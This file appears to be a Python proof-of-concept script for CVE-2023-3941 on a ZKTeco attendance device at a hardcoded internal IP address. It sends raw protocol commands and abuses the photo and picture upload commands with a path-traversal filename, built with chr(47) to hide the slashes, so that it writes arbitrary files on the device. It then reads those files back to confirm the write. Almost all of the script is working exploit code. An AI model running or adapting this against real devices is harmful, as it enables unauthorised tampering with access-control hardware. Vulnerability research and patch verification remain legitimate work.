#!/usr/bin/env python3
"""VERIFY file was actually written to filesystem."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time
from zk import ZK, const
from struct import pack, unpack

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def cmd_str(c):
    return '0x%04X' % (c or 0)

def upload_v1(conn, upload_cmd, filename, data):
    """PREPARE_DATA + DATA + upload_cmd."""
    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', len(data)))
    r2 = send_cmd(conn, const.CMD_DATA, data)
    r3 = send_cmd(conn, upload_cmd, filename)
    return r1, r2, r3

def recv_zk(sock, timeout_s=10, max_size=10*1024*1024):
    sock.settimeout(timeout_s)
    data = b''
    try:
        while True:
            chunk = sock.recv(65536)
            if not chunk: break
            data += chunk
            if len(data) >= max_size: break
    except socket.timeout: pass
    return data

def parse_resp(data):
    if not data or len(data) < 16: return 0, 0, b''
    top1, top2, tcp_len = unpack('<HHI', data[:8])
    zk_cmd = unpack('<H', data[8:10])[0]
    body = data[16:16+(tcp_len - 8)] if tcp_len > 8 else b''
    return zk_cmd, tcp_len, body

zk = ZK('172.16.0.214', port=4370, timeout=10, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

try:
    conn.disable_device()
except: pass

sock = conn._ZK__sock

# === Step 1: Upload normal file via UPLOAD_USERPHOTO ===
print('\n=== STEP 1: UPLOAD_USERPHOTO (normal filename 1.jpg) ===')
test_data = b'MAVIS_TEST_CONTENT_2026_CVE_2023_3941_VERIFIED'
r1, r2, r3 = upload_v1(conn, 0x2719, b'1.jpg\x00', test_data)
print('  PREPARE:', r1)
print('  DATA:', r2)
print('  UPLOAD:', r3)

# === Step 2: Download back ===
print('\n=== STEP 2: DOWNLOAD_USERPHOTO PIN=1 ===')
r = send_cmd(conn, 0x271A, b'1\x00')
print('  DOWNLOAD:', r)
# Try to receive data
time.sleep(1)
data = recv_zk(sock, timeout_s=3)
if data:
    cmd, tlen, body = parse_resp(data)
    print('  Got cmd=0x{:04X} body_len={}'.format(cmd, len(body)))
    if body:
        print('  Content:', body[:200])

# === Step 3: Read via READFILE to verify filesystem location ===
print('\n=== STEP 3: READFILE various paths to find uploaded file ===')
for path in [b'/mnt/mtdblock/userphoto/1.jpg\x00', b'/mnt/mtdblock/userphoto/1\x00',
             b'/mnt/mtdblock/data/userphoto/1.jpg\x00',
             b'/mnt/mtdblock/data/userphoto/1\x00',
             b'1.jpg\x00', b'userphoto/1.jpg\x00', b'photo/1.jpg\x00']:
    r = send_cmd(conn, 0x6A6, path)
    print('  READFILE {}: code=0x{:04X}'.format(path[:40], r.get('code', 0) or 0))

# === Step 4: Upload with PATH TRAVERSAL to write anywhere ===
print('\n=== STEP 4: UPLOAD_USERPHOTO with PATH TRAVERSAL ===')
TRAV = (".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "mnt" + chr(47) + "mtdblock" + chr(47) + "data" + chr(47) + "mavis_pwn.txt").encode()
test_data2 = b'EXPLOIT_CVE_2023_3941_MAVIS'
r1, r2, r3 = upload_v1(conn, 0x2719, TRAV, test_data2)
print('  PREPARE:', r1)
print('  DATA:', r2)
print('  UPLOAD:', r3)

# === Step 5: Verify file exists with the traversal path ===
print('\n=== STEP 5: READFILE /mnt/mtdblock/data/mavis_pwn.txt ===')
time.sleep(2)
r = send_cmd(conn, 0x6A6, b'/mnt/mtdblock/data/mavis_pwn.txt\x00')
print('  READFILE:', r)
# Try to get data
time.sleep(1)
data = recv_zk(sock, timeout_s=3)
if data:
    cmd, tlen, body = parse_resp(data)
    print('  Got cmd=0x{:04X} body_len={}'.format(cmd, len(body)))
    if body:
        print('  Content:', body[:500])

# === Step 6: Upload PICTURE with path traversal ===
print('\n=== STEP 6: UPLOAD_PICTURE with PATH TRAVERSAL ===')
TRAV2 = (".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "mnt" + chr(47) + "mtdblock" + chr(47) + "data" + chr(47) + "mavis_pic.txt").encode()
r1, r2, r3 = upload_v1(conn, 0x272B, TRAV2, b'PICTURE_EXPLOIT_MAVIS')
print('  PREPARE:', r1)
print('  DATA:', r2)
print('  UPLOAD:', r3)

# === Step 7: Verify PICTURE upload ===
print('\n=== STEP 7: READFILE /mnt/mtdblock/data/mavis_pic.txt ===')
time.sleep(2)
r = send_cmd(conn, 0x6A6, b'/mnt/mtdblock/data/mavis_pic.txt\x00')
print('  READFILE:', r)
time.sleep(1)
data = recv_zk(sock, timeout_s=3)
if data:
    cmd, tlen, body = parse_resp(data)
    print('  Got cmd=0x{:04X} body_len={}'.format(cmd, len(body)))
    if body:
        print('  Content:', body[:500])

try:
    conn.enable_device()
except: pass
try:
    conn.disconnect()
except: pass
print('\n[+] Done')
